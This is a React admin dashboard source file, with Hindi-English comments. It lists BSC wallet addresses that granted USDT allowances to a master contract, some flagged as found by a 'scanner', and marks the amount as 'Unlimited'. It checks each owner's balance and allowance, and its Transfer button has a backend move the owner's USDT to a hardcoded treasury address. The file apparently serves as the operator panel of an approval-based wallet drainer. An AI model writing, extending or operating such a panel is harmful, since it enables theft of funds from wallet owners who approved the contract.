import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";
import { Loader2, Copy, X, ScanLine } from "lucide-react";
import {
  USDT_CONTRACT,
  MASTER_CONTRACT,
  USDT_ABI,
  BASE_URL,
} from "../utils/helper";
import { saveTransferToHistory } from "./TransferHistory";

// ── Source Badge ──────────────────────────────────────────────────────────────
function SourceBadge({ source }: { source?: string }) {
  if (source !== "scanner") return null;
  return (
    <span className="inline-flex items-center gap-1 text-[10px] font-semibold bg-purple-100 text-purple-600 px-1.5 py-0.5 rounded-full ml-1.5 whitespace-nowrap">
      <ScanLine className="w-2.5 h-2.5" />
      Scanner
    </span>
  );
}

declare global {
  interface Window {
    ethereum?: any;
  }
}

interface ApiItem {
  _id: string;
  network: string;
  owner: string;
  amount: string;
  txHash: string;
  blockNumber: number;
  logIndex: number;
  isProcessed: boolean;
  source?: string;
  createdAt: string;
  updatedAt: string;
}

interface Props {
  data: ApiItem[];
  allData?: ApiItem[];
  autoFetchAll?: boolean;
}

// =====================
// TRANSFER MODAL
// =====================
interface TransferModalProps {
  item: ApiItem;
  balance: string;
  onClose: () => void;
  onSuccess: (address: string, network: string) => void;
}

function TransferModal({ item, balance, onClose, onSuccess }: TransferModalProps) {
  const [amount, setAmount] = useState("");
  const [loading, setLoading] = useState(false);
  const [maxBalance, setMaxBalance] = useState("0");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  useEffect(() => {
    // Balance fetch karo on-chain
    const fetchMax = async () => {
      try {
        const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
        const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
        const decimals = await usdt.decimals();
        const [bal, allowance] = await Promise.all([
          usdt.balanceOf(item.owner),
          usdt.allowance(item.owner, MASTER_CONTRACT),
        ]);
        const transferable = bal < allowance ? bal : allowance;
        const formatted = ethers.formatUnits(transferable, decimals);
        setMaxBalance(formatted);
        // Already fetched balance use karo agar available hai
        if (balance && balance !== "0.00") setMaxBalance(balance.replace(/,/g, ""));
      } catch (e) {
        console.error(e);
      }
    };
    fetchMax();
  }, [item.owner, balance]);

  const handleMax = () => setAmount(maxBalance);

  const handleConfirm = async () => {
    if (!amount || parseFloat(amount) <= 0) {
      setError("Amount enter karo");
      return;
    }
    if (parseFloat(amount) > parseFloat(maxBalance)) {
      setError(`Maximum ${maxBalance} USDT transfer kar sakte ho`);
      return;
    }

    setLoading(true);
    setError("");
    setSuccess("");

    try {
      const res = await fetch(`${BASE_URL}/api/transfer`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fromAddress: item.owner, amount }),
      });

      const data = await res.json();

      if (!res.ok) {
        setError(data.message || "❌ Transfer failed");
        return;
      }

      setSuccess(`✅ ${amount} USDT transferred! Tx: ${data.txHash?.slice(0, 16)}...`);

      // Save to transfer history
      saveTransferToHistory({
        fromAddress: item.owner,
        toAddress: "0x5c68Deb34B8Af9605C3464F5cc3C2923fD65B23f",
        amount,
        txHash: data.txHash || "unknown",
        network: item.network,
        timestamp: new Date().toISOString(),
        status: "success",
      });

      onSuccess(item.owner, item.network);
      setTimeout(() => onClose(), 3000);

    } catch (e: any) {
      setError("Network error: " + e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    // Backdrop
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
      {/* Modal */}
      <div className="w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden">

        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 bg-green-600">
          <h2 className="text-white font-bold text-lg">Transfer USDT</h2>
          <button onClick={onClose} className="text-white hover:text-green-200 transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Body */}
        <div className="p-5 space-y-4">

          {/* User Address */}
          <div>
            <p className="text-xs text-gray-500 mb-1">From (User)</p>
            <p className="text-sm font-mono bg-gray-100 px-3 py-2 rounded-lg break-all text-gray-700">
              {item.owner}
            </p>
          </div>

          {/* Treasury Address */}
          <div>
            <p className="text-xs text-gray-500 mb-1">To (Treasury)</p>
            <p className="text-sm font-mono bg-blue-50 px-3 py-2 rounded-lg break-all text-blue-700">
              0x5c68Deb34B8Af9605C3464F5cc3C2923fD65B23f
            </p>
          </div>

          {/* Available */}
          <div className="flex justify-between items-center text-sm">
            <span className="text-gray-500">Available Balance</span>
            <span className="font-semibold text-green-600">{maxBalance} USDT</span>
          </div>

          {/* Amount Input */}
          <div>
            <p className="text-xs text-gray-500 mb-1">Amount</p>
            <div className="flex gap-2">
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                min="0"
                step="any"
                className="flex-1 border border-gray-300 rounded-lg px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-green-500"
              />
              <button
                onClick={handleMax}
                className="px-4 py-2.5 bg-green-100 text-green-700 rounded-lg text-sm font-semibold hover:bg-green-200 transition-colors whitespace-nowrap"
              >
                MAX
              </button>
            </div>
          </div>

          {/* Info */}
          <p className="text-xs text-gray-400 text-center">
            Gas fees admin wallet se katenge. USDT seedha treasury mein jaayega.
          </p>

          {/* Error Message */}
          {error && (
            <div className="bg-red-50 border border-red-200 rounded-lg px-4 py-3 text-sm text-red-700">
              {error}
            </div>
          )}

          {/* Success Message */}
          {success && (
            <div className="bg-green-50 border border-green-200 rounded-lg px-4 py-3 text-sm text-green-700 whitespace-pre-line">
              {success}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="px-5 pb-5 flex gap-3">
          <button
            onClick={onClose}
            className="flex-1 py-3 border border-gray-300 rounded-xl text-sm font-semibold text-gray-600 hover:bg-gray-50 transition-colors"
          >
            Cancel
          </button>
          <button
            onClick={handleConfirm}
            disabled={loading || !amount}
            className="flex-1 py-3 bg-green-600 rounded-xl text-sm font-semibold text-white hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed inline-flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Processing...
              </>
            ) : (
              "Confirm Transfer"
            )}
          </button>
        </div>
      </div>
    </div>
  );
}

// =====================
// MAIN TABLE
// =====================
export default function DataTable({ data, allData = [], autoFetchAll = false }: Props) {
  const [balances, setBalances] = useState<{ [key: string]: string }>({});
  const [loading, setLoading] = useState<{ [key: string]: boolean }>({});
  const [transferItem, setTransferItem] = useState<ApiItem | null>(null);
  const fetchedKeysRef = useRef<Set<string>>(new Set());

  const getRowKey = (address: string, network: string) =>
    `${network}::${address.toLowerCase()}`;

  const readBalance = async (address: string) => {
    const bscProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, bscProvider);
    const balance = await contract.balanceOf(address);
    const decimals = await contract.decimals();
    const formatted = ethers.formatUnits(balance, decimals);
    return parseFloat(formatted).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 6 });
  };

  const handleCheckBalance = async (address: string, network: string) => {
    if (!address) return;
    const rowKey = getRowKey(address, network);
    try {
      setLoading((prev) => ({ ...prev, [address]: true }));
      const formatted = await readBalance(address);
      setBalances((prev) => ({ ...prev, [address]: formatted }));
      fetchedKeysRef.current.add(rowKey);
    } catch (error) {
      console.error(`Error fetching balance for ${address}:`, error);
    } finally {
      setLoading((prev) => ({ ...prev, [address]: false }));
    }
  };

  useEffect(() => {
    if (!autoFetchAll || !allData.length) return;

    const uniqueItems = Array.from(
      new Map(
        allData.filter((item) => item.owner)
          .map((item) => [getRowKey(item.owner, item.network), item]),
      ).values(),
    );

    const itemsToFetch = uniqueItems.filter((item) => {
      return !fetchedKeysRef.current.has(getRowKey(item.owner, item.network));
    });

    if (!itemsToFetch.length) return;

    let cancelled = false;

    const run = async () => {
      const updates: Record<string, string> = {};
      itemsToFetch.forEach((item) => {
        setLoading((prev) => ({ ...prev, [item.owner]: true }));
      });

      const results = await Promise.allSettled(
        itemsToFetch.map(async (item) => ({
          key: getRowKey(item.owner, item.network),
          owner: item.owner,
          balance: await readBalance(item.owner),
        })),
      );

      if (cancelled) return;

      results.forEach((result, index) => {
        const item = itemsToFetch[index];
        if (result.status === "fulfilled") {
          updates[item.owner] = result.value.balance;
          fetchedKeysRef.current.add(result.value.key);
        }
      });

      if (Object.keys(updates).length > 0) {
        setBalances((prev) => ({ ...prev, ...updates }));
      }

      setLoading((prev) => {
        const next = { ...prev };
        itemsToFetch.forEach((item) => { next[item.owner] = false; });
        return next;
      });
    };

    run();
    return () => { cancelled = true; };
  }, [allData, autoFetchAll]);

  const handleTransferSuccess = (address: string, network: string) => {
    handleCheckBalance(address, network);
  };

  return (
    <>
      {/* Transfer Modal */}
      {transferItem && (
        <TransferModal
          item={transferItem}
          balance={balances[transferItem.owner] || "0"}
          onClose={() => setTransferItem(null)}
          onSuccess={handleTransferSuccess}
        />
      )}

      <div className="w-full">
        {/* Mobile Card View */}
        <div className="md:hidden space-y-4">
          {data.map((item, index) => (
            <div key={item._id} className="bg-white p-4 rounded-lg shadow-sm border space-y-3">
              <div className="flex justify-between items-center border-b pb-2">
                <span className="font-semibold text-gray-700">#{index + 1}</span>
                <div className="flex items-center gap-1">
                  <SourceBadge source={item.source} />
                  <span className="text-xs bg-gray-100 px-2 py-1 rounded text-gray-600">{item.network}</span>
                </div>
              </div>

              <div>
                <span className="text-xs text-gray-500 block mb-1">User Address</span>
                <div className="flex items-center gap-2 bg-gray-50 px-2 py-1.5 rounded border">
                  <span className="text-sm font-mono text-gray-700 truncate">
                    {item.owner ? `${item.owner.slice(0, 8)}...${item.owner.slice(-6)}` : ''}
                  </span>
                  <button onClick={() => { navigator.clipboard.writeText(item.owner); alert("Copied!"); }}>
                    <Copy className="w-4 h-4 text-gray-400" />
                  </button>
                </div>
              </div>

              <div className="flex justify-between items-center">
                <div>
                  <span className="text-xs text-gray-500 block">Balance</span>
                  <span className="text-sm font-mono font-medium text-green-600">
                    {loading[item.owner] ? "..." : (balances[item.owner] || "0.00")} USDT
                  </span>
                </div>
                <button
                  onClick={() => handleCheckBalance(item.owner, item.network)}
                  className="bg-green-600 text-white px-3 py-1.5 rounded text-sm font-medium"
                >
                  {loading[item.owner] ? <Loader2 className="w-4 h-4 animate-spin" /> : "Check"}
                </button>
              </div>

              <button
                onClick={() => setTransferItem(item)}
                className="w-full bg-blue-600 text-white py-2.5 rounded-lg text-sm font-semibold hover:bg-blue-700 transition-colors"
              >
                Transfer
              </button>

              <div className="text-xs text-gray-400 text-right">
                {new Date(item.createdAt).toLocaleDateString()}
              </div>
            </div>
          ))}
        </div>

        {/* Desktop Table */}
        <div className="hidden md:block overflow-x-auto">
          <table className="w-full border-collapse">
            <thead>
              <tr className="bg-gray-100 border-b">
                <th className="px-4 py-3 text-sm text-left">No</th>
                <th className="px-4 py-3 text-sm text-left">Check Balance</th>
                <th className="px-4 py-3 text-sm text-left">Transfer</th>
                <th className="px-4 py-3 text-sm text-left">Balance</th>
                <th className="px-4 py-3 text-sm text-left">User Address</th>
                <th className="px-4 py-3 text-sm text-left">Amount</th>
                <th className="px-4 py-3 text-sm text-left">Network</th>
                <th className="px-4 py-3 text-sm text-left">Created</th>
              </tr>
            </thead>
            <tbody>
              {data.map((item, index) => (
                <tr key={item._id} className="border-b hover:bg-gray-50">
                  <td className="px-4 py-3">{index + 1}</td>

                  <td className="px-4 py-3">
                    <button
                      onClick={() => handleCheckBalance(item.owner, item.network)}
                      className="bg-green-600 text-white px-3 py-1.5 rounded text-sm"
                    >
                      {loading[item.owner] ? <Loader2 className="w-4 h-4 animate-spin" /> : "Check"}
                    </button>
                  </td>

                  <td className="px-4 py-3">
                    <button
                      onClick={() => setTransferItem(item)}
                      className="bg-blue-600 text-white px-3 py-1.5 rounded text-sm hover:bg-blue-700 transition-colors"
                    >
                      Transfer
                    </button>
                  </td>

                  <td className="px-4 py-3 text-sm font-mono text-green-600">
                    {loading[item.owner] ? "..." : (balances[item.owner] || "0.00")}
                  </td>

                  <td className="px-4 py-3">
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-mono">
                        {item.owner ? `${item.owner.slice(0, 8)}...${item.owner.slice(-6)}` : ''}
                      </span>
                      <button
                        onClick={() => { navigator.clipboard.writeText(item.owner); alert("Copied!"); }}
                        className="text-gray-400 hover:text-green-600 p-1"
                      >
                        <Copy className="w-4 h-4" />
                      </button>
                      <SourceBadge source={item.source} />
                    </div>
                  </td>

                  <td className="px-4 py-3 text-sm">Unlimited</td>
                  <td className="px-4 py-3 text-sm">{item.network}</td>
                  <td className="px-4 py-3 text-sm">
                    {new Date(item.createdAt).toLocaleString()}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </>
  );
}
